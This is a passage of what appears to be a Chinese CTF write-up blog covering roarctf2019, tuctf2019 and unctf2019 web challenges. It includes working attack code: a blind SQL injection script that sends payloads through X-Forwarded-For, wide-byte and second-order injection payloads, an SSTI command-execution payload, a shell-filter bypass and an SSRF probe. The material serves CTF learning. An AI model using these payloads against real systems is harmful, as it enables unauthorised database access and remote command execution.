<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&quot;http://aba32602-5c6b-4a9f-bfa6-bbf2ca660f7e.node3.buuoj.cn/Public/Uploads/2019-10-18/&quot;</span><br><span class="line">i=(int(&quot;5da9dd208595a&quot;,16)+1)</span><br><span class="line">while True:</span><br><span class="line">	print(url+hex(i)[2:]+&quot;.php&quot;)</span><br><span class="line">	res=requests.get(url+hex(i)[2:]+&quot;.php&quot;)</span><br><span class="line">	print(res.status_code)</span><br><span class="line">	if(res.status_code==200):</span><br><span class="line">		print(url+hex(i)[2:]+&quot;.php&quot;)</span><br><span class="line">		break</span><br><span class="line"></span><br><span class="line">	i+=1</span><br></pre></td></tr></table></figure>



<p>虽然说可以爆出来，不过也要跑好一会</p>
<h3 id="Online-Proxy"><a href="#Online-Proxy" class="headerlink" title="Online Proxy"></a>Online Proxy</h3><p>利用libcurl和paras_url的差异来判断</p>
<p><a target="_blank" rel="noopener" href="http://node3.buuoj.cn:28001/?url=http://user@39.108.164.219@ccccccccccccc.com">http://node3.buuoj.cn:28001/?url=http://user@39.108.164.219@ccccccccccccc.com</a></p>
<p>200</p>
<p><a target="_blank" rel="noopener" href="http://node3.buuoj.cn:28001/?url=http://user@ccccccccccccc.com@39.108.164.219">http://node3.buuoj.cn:28001/?url=http://user@ccccccccccccc.com@39.108.164.219</a></p>
<p>504</p>
<p>而访问<a target="_blank" rel="noopener" href="http://node3.buuoj.cn:28001/?url=http://39.108.164.219">http://node3.buuoj.cn:28001/?url=http://39.108.164.219</a></p>
<p>也是504,所以有可能使用file_get_contents来访问url</p>
<p>刚开始一直盯着url,后面看到收集信息,99%是sql注入的题</p>
<p>就是不知道要收集什么信息</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Debug Info: </span></span><br><span class="line"><span class="comment"> Duration: 0.20821499824524 s </span></span><br><span class="line"><span class="comment"> Current Ip: 127.0.0.1  --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Debug Info: </span></span><br><span class="line"><span class="comment"> Duration: 0.34751987457275 s </span></span><br><span class="line"><span class="comment"> Current Ip: &#x27;# </span></span><br><span class="line"><span class="comment">Last Ip: &#x27; --&gt;</span></span><br></pre></td></tr></table></figure>



<p>这题虽然是sql注入,但比较操蛋的是,sql注入的是last ip</p>
<p>因为这个加上自己的懒惰让我搞了8-9个小时,因小失大/fad</p>
<p>题目提示会收集信息,能收集的大概也就是ip地址</p>
<p>于是找到x-forward-for http注入,虽然说的轻松,但是我完全找了好久还加上了wp的帮助</p>
<p>emmmm直接扔脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rand_str</span>(<span class="params">length=<span class="number">8</span></span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(random.sample(string.ascii_letters + string.digits, length))</span><br><span class="line"></span><br><span class="line">ii=<span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">curl_url</span>(<span class="params">sql</span>):</span></span><br><span class="line">    <span class="keyword">global</span> ii</span><br><span class="line">    headers=&#123;</span><br><span class="line">        <span class="string">&quot;Host&quot;</span>:<span class="string">&quot;node3.buuoj.cn:28645&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cache-Control&quot;</span>:<span class="string">&quot;max-age=0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;X-Forwarded-For&quot;</span>:<span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>:<span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>:<span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>:<span class="string">&quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>:<span class="string">&quot;close&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    cookies=&#123;<span class="string">&quot;track_uuid&quot;</span>:<span class="string">&quot;1e3b12a4-60f8-4778-a0b7-%s;&quot;</span> % rand_str()&#125;</span><br><span class="line">    <span class="comment">#1&#x27;+if(ascii(substr(hex((select GROUP_CONCAT(table_name) FROM information_schema.tables WHERE TABLE_SCHEMA=database())),1,1))&gt;0,sleep(10),0)+&#x27;13</span></span><br><span class="line">    <span class="comment"># headers[&quot;X-Forwarded-For&quot;]=&quot;1&#x27;+if(&quot;+sql+&quot;,sleep(10),0)+&#x27;&quot;+str(ii)</span></span><br><span class="line">    url=<span class="string">&quot;http://node3.buuoj.cn:28841?url=http://127.0.0.1&quot;</span></span><br><span class="line">    <span class="comment">#清空</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        headers[<span class="string">&quot;X-Forwarded-For&quot;</span>]=<span class="string">&quot;clear&quot;</span>+<span class="built_in">str</span>(ii)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res= requests.get(url,headers=headers,cookies=cookies,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span> :</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Last Ip: clear&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        ii+=<span class="number">1</span></span><br><span class="line">    <span class="comment">#压入</span></span><br><span class="line">    headers[<span class="string">&quot;X-Forwarded-For&quot;</span>]=<span class="string">&quot;1&#x27;+if(&quot;</span>+sql+<span class="string">&quot;,sleep(10),0)+&#x27;&quot;</span>+<span class="built_in">str</span>(ii)</span><br><span class="line">    res= requests.get(url,headers=headers,cookies=cookies,timeout=<span class="number">3</span>)</span><br><span class="line">    <span class="comment">#执行</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        ii+=<span class="number">1</span></span><br><span class="line">        headers[<span class="string">&quot;X-Forwarded-For&quot;</span>]=<span class="string">&quot;clear&quot;</span>+<span class="built_in">str</span>(ii)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res= requests.get(url,headers=headers,cookies=cookies,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span> :</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> sql <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            curl_url(sql)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#database information_schema,test,mysql,ctftraining,performance_schema,F4l9_D4t4B45e,ctf</span></span><br><span class="line"><span class="comment">#table  F4l9_t4b1e</span></span><br><span class="line"><span class="comment">#column F4l9_C01uMn</span></span><br><span class="line"><span class="comment">#flag flag&#123;G1zj1n_W4nt5_4_91r_Fr1end&#125;,flag&#123;03a6ead5-ffec-4bc0-bffd-92efd5a81e11&#125;</span></span><br><span class="line">sql=<span class="string">&quot;(substr(hex((select GROUP_CONCAT(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e )),INDEX,1))=&#x27;GUESS&#x27;&quot;</span></span><br><span class="line">result=<span class="string">&quot;696e666f726d6174696f6e5f736368656d612c746573742c6d7973716c2c637466747261696e696e672c706572666F726D616E63655F736368656D612c46346c395&quot;</span></span><br><span class="line">result=<span class="string">&quot;666c61677b47317a6a316e5f57346e74355f345f393172115&quot;</span></span><br><span class="line">index=<span class="built_in">len</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    index+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        ii+=<span class="number">1</span></span><br><span class="line">        tmp=sql.replace(<span class="string">&quot;INDEX&quot;</span>,<span class="built_in">str</span>(index)).replace(<span class="string">&quot;GUESS&quot;</span>,<span class="built_in">hex</span>(i)[<span class="number">2</span>:])</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> curl_url(tmp):</span><br><span class="line">            result+=<span class="built_in">hex</span>(i)[<span class="number">2</span>:]</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;第&quot;</span>+<span class="built_in">str</span>(index)+<span class="string">&quot;不是&quot;</span>+<span class="built_in">hex</span>(i)[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2020/04/19/roarctf2019/" data-id="ckw63s4mj0066flol7rcrfy5m" data-title="roarctf2019" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-tuctf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/04/19/tuctf/" class="article-date">
  <time class="dt-published" datetime="2020-04-19T16:00:00.000Z" itemprop="datePublished">2020-04-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/04/19/tuctf/">tuctf2019</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="tuctf2019"><a href="#tuctf2019" class="headerlink" title="tuctf2019"></a>tuctf2019</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Router-Where-Art-Thou"><a href="#Router-Where-Art-Thou" class="headerlink" title="Router Where Art Thou?"></a>Router Where Art Thou?</h3><p> <a target="_blank" rel="noopener" href="http://chal.tuctf.com:30006/0.html">http://chal.tuctf.com:30006/0.html</a> </p>
<p> <a target="_blank" rel="noopener" href="http://chal.tuctf.com:30006/1.html">http://chal.tuctf.com:30006/1.html</a></p>
<p> <a target="_blank" rel="noopener" href="http://chal.tuctf.com:30006/2.html">http://chal.tuctf.com:30006/2.html</a>  </p>
<p><code>FIXME: need to use Page::includeStaticResource</code></p>
<p><code>2.html:603  hidden variables, we are going to set this to the session, bug fix 2157</code></p>
<p><a target="_blank" rel="noopener" href="https://192.168.1.254/">https://192.168.1.254/</a></p>
<p>….爆破密码获得flag</p>
<h3 id="Login-to-Access"><a href="#Login-to-Access" class="headerlink" title="Login to Access"></a>Login to Access</h3><p>当Referer不为<a target="_blank" rel="noopener" href="http://chal.tuctf.com:30001/login.html%E6%97%B6,%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5">http://chal.tuctf.com:30001/login.html时,存在sql注入</a></p>
<p>当Referer: <a target="_blank" rel="noopener" href="http://chal.tuctf.com:30001/login.hmtl%E6%97%B6sql">http://chal.tuctf.com:30001/login.hmtl时sql</a> 注入被过滤</p>
<p>对第一种情况sql注入得到</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#database:information_schema,challenge,mysql,performance_schema,sys </span></span><br><span class="line"><span class="comment">#table:users</span></span><br><span class="line"><span class="comment">#columns:user,password,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</span></span><br><span class="line"><span class="comment">#user,password,USER : dave,hunter2,dave</span></span><br></pre></td></tr></table></figure>



<p>利用得到的账号密码直接在第二步登陆无效,猜测第二步还要sql注入</p>
<ul>
<li>sql注入</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dave<span class="string">&#x27;+or+1%23 x</span></span><br><span class="line"><span class="string">dave&quot;+or+1%23 x</span></span><br><span class="line"><span class="string">dave&quot;)+or+1%23 x</span></span><br><span class="line"><span class="string">dave&#x27;</span>)+<span class="keyword">or</span>+<span class="number">1</span>%<span class="number">23</span> x</span><br><span class="line">\转义<span class="string">&#x27;或&quot;来逃逸失败</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<p>宽字节注入:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#username=%2bsleep(10)&amp;password=%bf%5c&quot; x</span></span><br><span class="line"><span class="comment">#username=%2bsleep(10)&amp;password=%bf%5c&#x27; x</span></span><br><span class="line"><span class="comment">#username=%bf%5c&quot;&amp;password=%2bsleep(10) x</span></span><br><span class="line"><span class="comment">#username=%bf%5c&#x27;&amp;password=%2bsleep(10) x</span></span><br></pre></td></tr></table></figure>







<p>sql注入点时username还是password</p>
<p>是单引号还是双引号闭合</p>
<p>过滤了哪些字符，转义了哪些字符</p>
<p>We then looked at the challenge’s description again and realized that there might be backup of file somewhere. We then tried to get the <strong>login.php.bak</strong>.</p>
<p><img src="https://khroot.com/wp-content/uploads/2019/11/image-201.png" alt="img"></p>
<p>Surprise, there really is a backup file there. Let’s see what is inside.</p>
<p><img src="https://khroot.com/wp-content/uploads/2019/11/image-202-1024x385.png" alt="img"></p>
<p>We found the flag, and it is <code>TUCTF&#123;b4ckup5_0f_php?_1t5_m0r3_c0mm0n_th4n_y0u_th1nk&#125;</code></p>
<h3 id="The-Droid-You’re-Looking-For"><a href="#The-Droid-You’re-Looking-For" class="headerlink" title="The Droid You’re  Looking For"></a>The Droid You’re  Looking For</h3><p>看到droid想到robots.txt,直接访问提示没有权限</p>
<p>因为robots.txt是给爬虫看的,所以去百度了一个google爬虫的user-agent:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1;</span><br></pre></td></tr></table></figure>

<p>robots.txt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: googleagentflagfoundhere.html</span><br></pre></td></tr></table></figure>

<p>TUCTF{463nt_6006l3_r3p0rt1n6_4_r0b0t}</p>
<h3 id="And-Now-For-Something-Completely-Different"><a href="#And-Now-For-Something-Completely-Different" class="headerlink" title="And Now, For Something Completely Different"></a>And Now, For Something Completely Different</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/usr/local/lib/python2.7/dist-packages/tornado/web.py&quot;</span>, line <span class="number">1509</span>, <span class="keyword">in</span> _execute</span><br><span class="line">    result = method(*self.path_args, **self.path_kwargs)</span><br><span class="line">  File <span class="string">&quot;/usr/src/app/class_website.py&quot;</span>, line <span class="number">87</span>, <span class="keyword">in</span> post</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(name) == <span class="number">0</span> <span class="keyword">or</span> <span class="built_in">len</span>(phone_num) == <span class="number">0</span> <span class="keyword">or</span> <span class="built_in">len</span>(email) == <span class="number">0</span> <span class="keyword">or</span> <span class="built_in">len</span>(passwd2) == <span class="number">0</span> <span class="keyword">or</span> passw != passw2:</span><br><span class="line">NameError: <span class="keyword">global</span> name <span class="string">&#x27;passwd2&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br></pre></td></tr></table></figure>

<p>在网页中发现</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- <span class="doctag">TODO:</span> add /welcome/test --&gt;</span></span><br></pre></td></tr></table></figure>

<p>打开只有welcome test &lt;==&gt; /welcome/test</p>
<p>猜测是ssti</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;__import__(&#x27;os&#x27;).popen(&#x27;cat flag.txt&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p> TUCTF{4lw4y5_60_5h0pp1n6_f0r_fl465} </p>
<h3 id="Cute-Animals-Company"><a href="#Cute-Animals-Company" class="headerlink" title="Cute Animals Company"></a>Cute Animals Company</h3><p>修改cookie获得登陆权限</p>
<p>sqlmap得到密码</p>
<p>file:///etc/passwd获得flag???</p>
<p>http访问都不行的呀</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2020/04/19/tuctf/" data-id="ckw63s4mr006kflol29xvgwpr" data-title="tuctf2019" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-unctf2019" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/04/19/unctf2019/" class="article-date">
  <time class="dt-published" datetime="2020-04-19T16:00:00.000Z" itemprop="datePublished">2020-04-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/04/19/unctf2019/">unctf2019</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="unctf2019"><a href="#unctf2019" class="headerlink" title="unctf2019"></a>unctf2019</h1><h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    <span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"> <span class="comment">// try bypass it</span></span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/\&#x27;|\&quot;|,|;|\`|\\|\*|\n|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;</span>, <span class="variable">$a</span>))</span><br><span class="line">        <span class="variable">$a</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable">$a</span> =<span class="string">&#x27;&quot;&#x27;</span> . <span class="variable">$a</span> . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/\&#x27;|\&quot;|;|,|\`|\*|\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;</span>, <span class="variable">$b</span>))</span><br><span class="line">        <span class="variable">$b</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable">$b</span> = <span class="string">&#x27;&quot;&#x27;</span> . <span class="variable">$b</span> . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">     <span class="variable">$cmd</span> = <span class="string">&quot;file <span class="subst">$a</span> <span class="subst">$b</span>&quot;</span>;</span><br><span class="line">      str_replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;<span class="subst">$cmd</span>&quot;</span>); </span><br><span class="line">     system(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>用<code>a=\&amp;b=\</code>来逃脱引号</p>
<p>用?来匹配,但是隐藏文件是无法显示的要自己在前面加一个.</p>
<p><code>file &quot;\&quot; -f &quot;  \&quot;</code></p>
<p>最后在<code>http://101.71.29.5:10054/.F1jh_/h3R3_1S_your_F1A9.txt</code>里找到flag</p>
<p><code>unctf&#123;86dfe85d7c5842c5c04adae104193ee1&#125;</code></p>
<h2 id="NSB-RESET-PASSWORD"><a href="#NSB-RESET-PASSWORD" class="headerlink" title="NSB RESET PASSWORD"></a>NSB RESET PASSWORD</h2><p>题目说是重置密码,刚开始我想的是越权</p>
<p>后面搞了好久都不行。后面试着弄了一下发现一个验证码可以多次用.</p>
<p>我就猜有可能是条件竞争</p>
<p>先注册一个账号用收到的验证码重置，然后再用admin账号请求重置密码</p>
<p>然后直接跳到修改密码的界面,修改一下就出来了</p>
<p> flag{175f3098f80735ddfdfbd4588f6b1082} </p>
<h2 id="帮赵总征婚"><a href="#帮赵总征婚" class="headerlink" title="帮赵总征婚"></a>帮赵总征婚</h2><p>盲猜sql注入</p>
<p>转义:<code>&#39;,&quot;,\,#</code></p>
<p>还给了我们一个phpinfo?????</p>
<p>我也想帮赵总征婚啊，可是我没机会</p>
<p>remember_me 是否可以注入?</p>
<h2 id="inject-twice"><a href="#inject-twice" class="headerlink" title="inject twice"></a>inject twice</h2><p>题目是sql-lab的源码</p>
<p>二次注入点</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="comment"># Validating the user input........</span></span><br><span class="line">	<span class="variable">$username</span>= <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">	<span class="variable">$curr_pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;current_password&#x27;</span>]);</span><br><span class="line">	<span class="variable">$pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">	<span class="variable">$re_pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$pass</span>==<span class="variable">$re_pass</span>)</span><br><span class="line">	&#123;	</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br><span class="line">		<span class="variable">$res</span> = mysql_query(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be smart, Try harder!!!! :( &#x27;</span>);</span><br><span class="line">		<span class="variable">$row</span> = mysql_affected_rows();</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$row</span>==<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;Password successfully updated&quot;</span>;</span><br><span class="line">	</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			header(<span class="string">&#x27;Location: failed.php&#x27;</span>);</span><br><span class="line">			<span class="comment">//echo &#x27;You tried to be smart, Try harder!!!! :( &#x27;;</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&lt;center&gt;&#x27;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Make sure New Password and Retype Password fields have same value&quot;</span>;</span><br><span class="line">		header(<span class="string">&#x27;refresh:2, url=index.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>但是得到admin账号后,并没有得到flag,估计要把数据库给溜一圈。</p>
<p>黑名单:<code>or, </code></p>
<p>注册一个<code>hello\</code>的账号,就可以用,currentpass来注入,但是环境炸了,我sleep了一下就奇奇怪怪了</p>
<p>//////////////???????????????????</p>
<p>currentpass=<code>/**/or/**/1-- a</code></p>
<p>数据库名<code> or (SELECT substr(hex(group_concat(schema_name)),1,1) FROM information_schema.schemata)=char(54)-- a</code></p>
<p>information_schema,metinfo,mysql,performance_schema,security,sys</p>
